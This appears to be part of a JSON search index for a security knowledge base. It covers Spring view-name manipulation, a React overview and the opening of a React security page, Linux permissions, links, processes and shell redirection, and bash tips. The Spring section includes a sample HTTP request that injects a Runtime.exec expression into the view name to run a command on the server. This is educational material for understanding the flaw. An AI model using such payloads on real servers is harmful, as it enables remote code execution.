explicitly tell Spring what view name to use. As described in the documentation, for some return types such as void, java.util.Map or org.springframework.ui.Model, the view name is implicitly determined through a RequestToViewNameTranslator.\nThis means that at first glance such a controller may seem completely innocent, it does almost nothing, but since Spring does not know which view name to use, it takes it from the request URI.\n@GetMapping(\"/doc/{document}\")\npublic void getDocument(@PathVariable String document) {\n    log.info(\"Retrieving \" + document);\n}\n\nSpecifically, DefaultRequestToViewNameTranslator does the following:\n/**\n * Translates the request URI of the incoming {@link HttpServletRequest}\n * into the view name based on the configured parameters.\n * @see org.springframework.web.util.UrlPathHelper#getLookupPathForRequest\n * @see #transformPath\n */\n@Override\npublic String getViewName(HttpServletRequest request) {\n    String lookupPath = this.urlPathHelper.getLookupPathForRequest(request, HandlerMapping.LOOKUP_PATH);\n    return (this.prefix + transformPath(lookupPath) + this.suffix);\n}\n\nSo, it becomes vulnerable because the user controlled data (URI) comes in directly to view name and is resolved as an expression:\nGET /doc/__${T(java.lang.Runtime).getRuntime().exec(\"touch executed\")}__::.x HTTP/1.1\nHost: vulnerable-website.com\n\nReferences\n\nSpring View Manipulation Vulnerability\n\n"},"Framework/React/overview.html":{"url":"Framework/React/overview.html","title":"Overview","keywords":"","body":"ReactJS overviewComponents and propsJSXElementsSafe by designReferencesReactJS overview\nReactJS is a JavaScript library for building user interfaces.\nComponents and props\nComponents are the basic building block of ReactJS. Conceptually, they are like JavaScript functions. They accept arbitrary inputs props and return React elements describing what should appear on the screen.\nThe simplest way to define a component is to write a JavaScript function:\nfunction Welcome(props) {\n    return Hello, {props.name};\n}\n\nThis function is a valid React component because it accepts a single props (which stands for properties) object argument with data and returns a React element. Such components are called function components because they are literally JavaScript functions.\nAnother way to define a component is to use an ES6 class:\nclass Welcome extends React.Component {\n    render() {\n        return Hello, {this.props.name};\n    }\n}\n\nThe above two components are equivalent from React's point of view.\nJSX\nReact components use JSX, a syntax extension to JavaScript. During the build process, the JSX code is transpiled to regular JavaScript (ES5) code.\nThe following two examples are equivalent:\n// JSX\nconst element = (\n    \n    Hello, world!\n    \n);\n\n// Transpiled to createElement() call\nconst element = React.createElement(\n  'h1',\n  {className: 'greeting'},\n  'Hello, world!'\n);\n\nElements\nNew React elements are created from component classes using the createElement function:\nReact.createElement(\n  type,\n  [props],\n  [...children]\n)\n\nThis function takes three arguments:\n\ntype can be either a tag name string (such as div or span), or a component class.\nprops contains a list of attributes passed to the new element.\nchildren contains the child node(s) of the new element (which are additional React components).\n\nSafe by design\nReactJS implements security controls by design, for example, string variables in views are escaped automatically.\nReferences\n\nExploiting Script Injection Flaws in ReactJS Apps\n\n"},"Framework/React/security-issues.html":{"url":"Framework/React/security-issues.html","title":"Security Issues","keywords":"","body":"Controlling element typeInjecting propsExplicitly setting dangerouslySetInnerHTMLExplicitly setting hrefAbusing server-side renderingReferencesControlling element type\nThe createElement function accepts a string in the type argument.

For example, if an executable has the setuid bit set and is owned by the root, it will run with root privileges when launch as a normal user.\nAn example of an executable with the setuid permission set is passwd, the utility you can use to change your login password. You can verify that by using the ls command:\n$ ls -l /usr/bin/passwd\n-rwsr-xr-x 1 root root 54256 Mar 26  2019 /usr/bin/passwd\n\nYou can identify the presence of the setuid bit by the presence of the s in place of the x of the executable bit on the \"user\" section (see the command output above).\nThe s implies that the executable bit is set, otherwise you would see a capital S. This happens when the setuid bit is set, but the executable bit is not, showing the user an inconsistency: the setuid bit has no effect if the executable bit is not set.\nsetgid bit\n {% hint style=\"info\" %} \nThe setgid bit has effect on both files and directories\n {% endhint %} \nA file which has the setgid bit set is executed with the privileges of the group that owns the file. In other words, the process group-id will be the same as the file.\nWhen setgid is used for a directory, files created in that directory will be owned by the parent directory group, not the user who created them. This is often used to ease the sharing of files (files will be modifiable by all the users that are part of a certain group).\n$ ls -l some_folder\ndrwxrwsr-x 1 0xn3va staff 256 Feb 6 04:37 some_folder\n\nYou can identify the presence of the setgid bit by the presence of the s in place of the x of the executable bit on the \"group\" section (see the command output above).\nThe s implies that the executable bit is set, otherwise you would see a capital S.

Typically it is writable by all users on the system, so to make impossible for one user to delete the files of another one, the sticky bit is set:\nIt is usually writable by all users on the system, so sticky bit is set to prevent one user from modifying or deleting files of another one:\n$ ls -ld /tmp\ndrwxrwxrwt 2 root wheel 64 Feb 7 08:50 /tmp\n\nYou can identify the presence of the sticky bit by the presence of the t in place of the x of the executable bit on the \"other\" section (see the command output above).\nThe t implies that the executable bit is set, otherwise you would see a capital T. This happens when the sticky bit is set, but the executable bit is not, showing the user an inconsistency: the sticky bit has no effect if the executable bit is not set.\nrwx\nFor files:\n\nr can read\nw can write \nx can execute\n\nFor directories it is approximately:\n\nr can list files\nw can create files\nx can cd into & modify files\n\nEntry type\nHowever, if you look at the metadata:\n$ stat -LF\ncrw--w---- 1 0xn3va tty 16,2 Feb  7 09:29:10 2021 (stdin)\n\nYou will see that the string with permissions crw--w---- contains 10 characters. The first one is a special entry type character describes the type of file:\n\nb - block special file\nc - character special file\nd - directory\nl - symbolic link\ns - socket link\np - FIFO\n- - regular file\n\nchmod\nYou can use chmod utility to change file permissions. In the backend chmod is interacting with the files inode.\nSince you need 3 bits to represent each permission, you can convert that to an integer and pass that to chmod, for example:\n$ chmod 721 .\n# or rwx-w---x\n# or all permissions for the owner, write permissions to the group and execute permissions to others\n\nThe setuid, setgid, and sticky bits are represented respectively by a value of 4, 2 and 1, for example:\n# set the setgid bit on the directory\n$ chmod 2775 .\n\nFor more usage examples see here\nYou can also restrict access to yourself, removing all read, write, and execution permissions for yourself. If the file metadata were stored in the file itself, you would not be able to change permissions again (since you can not write to the file). That is another reason why inodes are cool: they can always be modified by the file owner and root, so you can restore your permissions.\nFile linking\nHard links and symbolic links are two different methods of linking to a file on a hard drive. These methods are the part of the file system that defines the file and its location.\n\nHard link\nHard links are two filenames that point to the same file (you can think of them as file aliases). For example, . and .. are hard links to current and parent directory on the system.\nUse ln to create a hard link:\n$ ls -li\ntotal 0\n1637699 -rw-r--r--  1 0xn3va  wheel  0 Feb  7 10:03 a\n\n# Create x as a hard link to a\n$ ln a x\n\n$ ls -li\ntotal 0\n1637699 -rw-r--r--  2 0xn3va  wheel  0 Feb  7 10:03 a\n1637699 -rw-r--r--  2 0xn3va  wheel  0 Feb  7 10:03 x\n\nNote that both files have the same inode number. Modifying x or a changes the same file.\nSymbolic link\nSymbolic links are links from one place to another. A symbolic link is a new file, separate from original, that links to the original file.\nUse ln to create a symbolic link:\n$ ls -li\ntotal 0\n1637699 -rw-r--r--  1 0xn3va  wheel  0 Feb  7 10:03 a\n\n# Create y as a symbolic link to a\n$ ln -s a y\n\n$ ls -li\ntotal 0\n1637699 -rw-r--r--  2 0xn3va  wheel  0 Feb  7 10:03 a\n1638321 lrwxr-xr-x  1 0xn3va  wheel  1 Feb  7 10:09 y -> a\n\ny is a symbolic link, a new small file (see size is 1). Modifying y changes a. \nFile structure\nThe file system can be thought of as a tree-like data structure. Each node (inode) has a pointer to its parent, itself, and all of its children.

Redirection simply means capturing output from a file, command, program, script, or even code block within a script and sending it as input to another file, command, program, or script.\n## command_output >\n# Redirect stdout to a file\n# Creates the file if not present, otherwise overwrites it.\n$ ls -la > ls_result.txt\n\n## : > filename\n# The '>' truncates file 'filename; to zero length\n# If file not present, creates zero-length file (same effect as 'touch')\n# The ':' serves as a dummy placeholder, producing no output\n$ : > empty_file.txt\n\n## command_output >>\n# Redirect stdout to a file\n# Creates the file if not present, otherwise appends to it\n$ ls -la >> ls_result.txt\n\nEach open file gets assigned a file descriptor. The file descriptors for stdin, stdout, and stderr are 0, 1, and 2, respectively. For opening additional files, there remain descriptors 3 to 9.\n## m>n\n# 'm' is a file descriptor, which defaults to 1, if not explicitly set\n# 'n' is a filename\n# File descriptor 'm' is redirect to file 'n'\n$ ls -la > ls_result.txt\n$ ls -la 1>ls_result.txt\n$ ./script.sh 2>error.log\n\n## m>&n\n# 'm' is a file descriptor, which defaults to 1, if not set\n# 'n' is another file descriptor\n$ ./script.sh 2>&1 > log.txt\n\n## &>filename\n# Redirect both stdout and stderr to file 'filename'\n$ ./script.sh &>filename\n\n## \nYou can ensure none of your redirects clobber an existing file by setting the noclobber option in the shell:\n$ set -o noclobber\n$ sort file.txt > file.txt\n-bash: file.txt: cannot overwrite existing file\n\nReferences\n\nHow Unix Works: Become a Better Software Engineer\nAdvanced Bash-Scripting Guide: I/O Redirection\n\n"},"Linux/Overview/process.html":{"url":"Linux/Overview/process.html","title":"Process","keywords":"","body":"AttributesLifecycleReferencesThere are three components to remember about a process:\n\nProgram file - the code and data\nProcess image - this stores the stack, variables currently defined, data, address space, and more; when it is time to run, the OS knows exactly how to recreate the process using this image\nProcess - the running program in memory\n\nWhen a process starts running, it inherits the user-id and group-id from the parent process. This information controls the level of access to the process. You can use setuid or setgid to enable a process to inherit the file owner permissions.\nAttributes\n\nEach process has the following attributes:\n\nUnique identifier called process-id or pid\nLink to the parent process that spawned it\n\nThere is a special root parent process called init, it usually has pid 1. The ppid of init is 0 (which conventionally means it has no parent). The pid 0 corresponds to the kernel scheduler, which is not a user process.\n\nsystemd is now replacing init on Linux, it solves a few problems with init and overall more stable, read more here\n\nLifecycle\nThere is a common pattern in UNIX on how processes work:\n\nA new child process is created by cloning the existing parent process fork()\nThis new child process calls exec() to replace the parent process running in the child with the process the child wants to run\nThe child process calls exit() to terminate itself; it only passes an exit code out; 0 means success, everything else is an error code\nThe parent process needs to call the wait() system call to get access to this exit code\n\nThis cycle repeats for every process spawned.\n\nThere are a few things that might go wrong here:\n\nWhat if the parent does not call wait()? This results in a zombie process - which is a resource leak, since the OS can not clean up processes before their exit code has been consumed by the parent\nWhat if the parent dies before the child process? This results in an orphan process; an orphan process is adopted by the init process (the special root parent), which then waits on the child process to finish\n\nHow can the parent get access to additional information from the child? This is not possible with exit codes. However, there are other ways to do inter process communication.\nReferences\n\nHow Unix Works: Become a Better Software Engineer\n\n"},"Linux/Overview/inter-process-communication.html":{"url":"Linux/Overview/inter-process-communication.html","title":"Inter Process Communication","keywords":"","body":"\n"},"Linux/Overview/shell.html":{"url":"Linux/Overview/shell.html","title":"Shell","keywords":"","body":"PipesVariablesReferencesWhen the shell is started, the OS provides three files for it to work with: stdin, stdout and stderr. When run from the terminal, stdin is connected to the keyboard input. What you write is passed to the terminal. This happens via a file called tele typewriter or tty. stdout and stderr is connected to tty too, this is why the output and errors of any command you run show up in the terminal.\n\nEvery terminal you open gets assigned a new file via tty, so that commands from one terminal do not clobber another. You can find out the file your terminal is attached to via the tty command:\n$ tty\n/dev/pts/0\n\nPipes\n\nPipe, |, bridges two processes together. It represents the system call to pipe() and all it does is redirect stdin and stdout for processes.\n\nThe image above is a slight simplification to explain pipe redirection:\n\nThe top bash forks another bash connected to tty, which produces the output of ls\nSince the top bash was forked from the lower, it inherited the file descriptors of the lower one\nThe lower bash did not fork a new process because echo is a builtin command\n\n\nNote that stderr is always routed directly to the tty. You can switch streams before the pipe and redirect stderr instead of stdout to the pipe.\n$ ./script.sh 2>&1 >/dev/null\n\nVariables\nLocal variables are ones you can create in a shell. They are local to the shell, thus not passed to children (remember, every non-builtin command is in a new shell which does not have these local variables).\nEnvironment variables (env vars) are like global variables. They are passed to children. However, changes to the environment variables in child process can not be passed to the parent (remember, there is no communication between child and parent except the exit code).\n$ env\nTERM=xterm\nTMPDIR=/tmp\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nPWD=/\nLANG=en_US.UTF-8\nSHLVL=1\nHOME=/root\nLANGUAGE=en_US:en\nLESSOPEN=||/usr/bin/lesspipe.sh %s\n_=/bin/env\n\nReferences\n\nHow Unix Works: Become a Better Software Engineer\n\n"},"Linux/Overview/signals.html":{"url":"Linux/Overview/signals.html","title":"Signals","keywords":"","body":"\n"},"Linux/Overview/socket.html":{"url":"Linux/Overview/socket.html","title":"Socket","keywords":"","body":"SocketsUNIX domain socketsSockets\n\nUNIX domain sockets\n\n"},"Linux/Overview/user-kernel-space.html":{"url":"Linux/Overview/user-kernel-space.html","title":"User Space vs Kernel Space","keywords":"","body":"\n"},"Linux/bash-tips.html":{"url":"Linux/bash-tips.html","title":"Bash Tips","keywords":"","body":"Bash multiprocessingUseful commandscheat.sharia2cchmodcurlfindgrepipythonncdupvtaryoutube-dlModern Unix\nBash multiprocessing\n {% embed url=\"https://fr1nge.xyz/posts/supercharge-your-bash-scripts-with-multiprocessing/\" %} \nUseful commands\ncheat.sh\ncheat.sh provides unified access to the best community driven cheat sheets repositories of the world.\n# To get a cheat sheet just use the following command\n# Change  to command name, for instance, ls, id, curl, etc.\n$ curl cheat.sh/\n\n# Cheat sheet for curl\n$ curl cheat.sh/curl\n\naria2c\naria2 is a lightweight multi-protocol & multi-source, cross platform download utility operated in command-line.\n# Multi-thread downloading\n$ aria2c -x5 \n\n# Restarting aria2c continues unfinished download\n$ aria2c -x5 \n^C\n$ aria2c -x5  # downloading continues\n\n# Download torrent files (just pass the torrent file to the input)\n$ aria2c .torrent\n\nchmod\n# Enable all permissions for the owner, write permissions to the group and execute permissions to others\n# or rwx-w---x\n$ chmod 721 \n\n### Verbose form\n# Enable user for rwx\n$ chmod u+rwx \n\n# Enable group for w\n$ chmod g+w \n\n# Enable others for x\n$ chmod o+x \n\n# Enable everyone for x\n$ chmod a+x \n\n### Remove permissions (use '-' instead of '+')\n# Disable group and others for x\n$ chmod og-x \n\n### setuid (4), setgid (2), sticky (1) bits\n# Set setgid bit\n# or rwxr-sr-x\n$ chmod 2755 \n\n## Verbose form\n# Set setuid bit \n$ chmod u+s \n\n# Set setgid bit\n$ chmod g+s \n\n# Set sticky bit\n$ chmod o+t \n\ncurl\ncurl a command line tool and library for transferring data with URL syntax.\nUseful operation mode:\n\n-o, --output  - write output to file instead of stdout.\n-X, --request  - specifies a custom request method to use when communicating with the HTTP server.\n-H, --header header/@file - extra header to include in the request when sending HTTP to a server.\n-d, --data  - adds body to the request.\n--path-as-is - tell curl to not handle sequences of /../ or /./ in the given URL path.\n-v, --verbose - makes curl verbose during the operation.\n\nfind\n# Case sensitive search\n$ find / -name '*some*'\n\n# Case insensitive search\n$ find / -iname '*some*'\n\n# ls style output formatting\n$ find / -iname '*some*' -ls\n\n# Delete found files (danger: there is no confirmation)\n$ find dir_to_delete/ -delete\n\n# Executing a script with search results\n# Format: \n#   -exec  {} \\;\n#    - script/command to execute\n#   {} - place for the found file\n#   \\;
